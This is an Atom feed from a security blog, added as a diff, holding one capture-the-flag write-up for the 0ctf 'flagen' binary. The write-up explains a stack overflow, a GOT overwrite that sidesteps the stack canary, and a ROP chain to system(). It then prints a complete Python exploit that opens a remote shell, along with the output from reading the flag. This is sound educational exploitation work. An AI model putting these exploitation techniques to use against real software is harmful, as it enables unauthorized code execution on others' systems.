@@ -1,0 +1,253 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: X86 | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/x86/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2015-03-30T20:15:08+02:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[0ctf - Flagen]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/"/>
+    <updated>2015-03-30T19:32:07+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-flagen</id>
+    <content type="html"><![CDATA[<p>0ctf sported a number of challenges and I was happy to grab a few flags. Here&rsquo;s how we solved <code>flagen</code>.</p>
+
+<!-- more -->
+
+
+<p><code>flagen</code> is a 32-bit ELF, and we&rsquo;re also given the corresponding <code>libc</code> library. It functions as a flag generator, which can perform various functions on the input:</p>
+
+<pre><code>== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+</code></pre>
+
+<p>We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is <code>leetify</code>, because this takes the input and transforms it to leet-speak:</p>
+
+<pre><code>== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 1
+Hello World!
+Done.
+== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 4
+Done.
+== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 6
+The Flag is: 1-13110 W0r1d!
+Done.
+</code></pre>
+
+<p>There are several transformations done, but most importantly, the <code>H</code> is translated into <code>1-1</code>. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times <code>H</code> and then asking it to perform <code>leetify</code>, the program generates a segmentation fault.</p>
+
+<h2>Narrowing down</h2>
+
+<p>After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of <code>H</code> bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it&rsquo;s time to get creative.</p>
+
+<p>The epilogue of the vulnerable function looks like this:</p>
+
+<pre><code>8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
+8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
+8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
+8048ae1: mov    DWORD PTR [esp],eax
+8048ae4: call   80484f0 &lt;strcpy@plt&gt;
+8048ae9: mov    eax,DWORD PTR [ebp-0xc]
+8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
+8048af3: je     8048afa &lt;atoi@plt+0x59a&gt;
+8048af5: call   80484e0 &lt;__stack_chk_fail@plt&gt; ; terminate if canary is overwritten
+8048afa: add    esp,0x124
+8048b00: pop    edi
+8048b01: pop    ebp
+8048b02: ret    
+</code></pre>
+
+<p>Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will <em>always</em> call <code>stack_chk_fail</code> and terminate. Luckily, <code>stack_chk_fail</code> is an imported function, which means we can overwrite its GOT entry with the hijacked <code>strcpy</code>! This will lead to control over <code>eip</code>. Just one final hurdle&hellip;</p>
+
+<h2>ROP it likes it&rsquo;s hot</h2>
+
+<p>NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice <code>add esp, 0x1c; pop pop pop pop ret</code> gadget and decided to overwrite <code>stack_chk_fail</code> with that address. This will pivot <code>esp</code> into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of <code>read</code> to make it point to <code>system</code>. Then, write out the string <code>sh;</code> in memory and using that as an argument for <code>system</code>.</p>
+
+<p>To make this happen, I just two more gadgets:</p>
+
+<pre><code class="python"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
+# 0x08048aff : add [edi + 0x5d], bl; ret
+</code></pre>
+
+<p>With the first gadget, I could control the values of various registers, provided there are no bad chars. <code>0x00</code> is obviously bad, but remember, we pass the buffer to <code>leetify</code>: it will mangle chars like <code>H</code> and <code>s</code>! These must also be avoided, which is why the ROP chain builds the characters <code>s</code> and <code>h</code> in two parts in memory.</p>
+
+<p>The second gadget allows me to adjust values. Because <code>libc</code> is given, the output of <code>nm -D ./libc.so.6</code> could be grepped for <code>system</code> and <code>read</code>. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out <code>sh;</code> into an empty piece of GOT memory. Finally, ret2system via <code>read@plt</code> and pop a shell!</p>
+
+<p>The final exploit:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('localhost', 6666))
+    s.connect(('202.112.28.115', 5149))
+
+    raw_input()
+
+    readtil('choice: ')
+    sendln('1')     # input flag
+
+    # gadgets 
+    # 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
+    # 0x08048aff : add [edi + 0x5d], bl; ret
+
+    # start building the ropchain
+    payload = ''
+    # 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain
+    payload += p(0x8048d89) 
+    payload += '0000'*2 # junk
+
+    # from libc.6.so:
+    # 00040190 W system
+    # 000dabd0 W read
+
+    ### first byte
+    payload += p(0x08048d8c)
+    payload += p(0xffffffc0)    # ebx, lower byte is important read -&gt; system (0xd0 + 0xc0 = 0x190)
+    payload += p(-1)            # esi
+    payload += p(0x804b00c-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### second byte
+    payload += p(0x08048d8c)
+    payload += p(0xffffff56)    # ebx, lower byte is important read -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
+    payload += p(-1)            # esi
+    payload += p(0x804b00d-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### third byte
+    payload += p(0x08048d8c)
+    payload += p(0xfffffff7)    # ebx, lower byte is important sprintf -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
+    payload += p(-1)            # esi
+    payload += p(0x804b00e-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff39)    # ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)
+    payload += p(-1)            # esi
+    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    payload += p(0x08048d8c)
+    payload += p(0xffffff3a)    # ebx, 3a 
+    payload += p(-1)            # esi
+    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff34)    # ebx, 68 == h
+    payload += p(-1)            # esi
+    payload += p(0x0804b200-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    payload += p(0x08048aff)    # 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == 'h'
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff3b)    # ebx, 3b == ;
+    payload += p(-1)            # esi
+    payload += p(0x0804b201-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ###
+    payload += p(0x80484a0)     # read@plt -&gt; points to system()
+    payload += '1111'           # fake ret addr
+    payload += p(0x0804b1ff)    # pointer to 'sh;'
+
+    ropchain_length = len(payload)
+    adjust_with_H = ((276-len(payload))/3)
+
+    payload += 'H' * adjust_with_H  # add the correct amount of H's needed for the overflow; the pointer for strcpy() is at esp+276
+    payload += 'A' * (276-ropchain_length-adjust_with_H*3) # how many A bytes do we need to make up the buffer to exactly 276 bytes?
+    payload += p(0x804b01c) # point the strcpy to this address: stack_chk_fail@got &gt;;]
+
+    sendln(payload)
+
+    readtil('choice: ')
+    sendln('4')     # leetify
+
+    print "[+] enjoy your shell!"
+
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+
+    s.close()
+
+pwn()
+</code></pre>
+
+<pre><code>bas@tritonal:~/tmp/0ctf/flagen$ python ./exploit.py 
+
+[+] enjoy your shell!
+id
+uid=1001(flagen) gid=1001(flagen) groups=1001(flagen)
+whoami
+flagen
+cat /home/flagen/flag
+0ctf{delicious_stack_cookie_generates_flag}
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
